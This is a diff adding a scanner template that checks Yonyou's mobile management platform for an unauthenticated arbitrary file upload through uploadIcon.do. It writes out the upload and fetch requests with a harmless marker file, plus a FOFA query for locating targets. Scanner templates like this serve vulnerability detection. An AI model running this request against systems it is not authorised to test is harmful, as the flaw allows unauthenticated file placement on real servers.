@@ -1,0 +1,43 @@
+## id: VEID-2024-0105
+## name: 用友移动管理平台uploadIcon任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,file,veid2024
+## description:用友移动管理平台前台未授权任意文件上传
+## fofa-query: app="用友-移动系统管理"
+## verification: true
+
+
+
+POST /maportal/appmanager/uploadIcon.do HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh1ZETbVA73oQbnyE
+
+------WebKitFormBoundaryh1ZETbVA73oQbnyE
+Content-Disposition: form-data; name="iconFile";filename="a.txt"
+
+hello veil
+------WebKitFormBoundaryh1ZETbVA73oQbnyE--
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "json" 
+#@ matcher: body contains "status"
+
+
+---
+
+GET /maupload/img/a.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "hello veil"
+
+
+
+
+
+# @VEIL-STAMP: b64a64e16a7836e12a11cd999e7173e62f45601d1c83a8e7e2a6f443626ee659
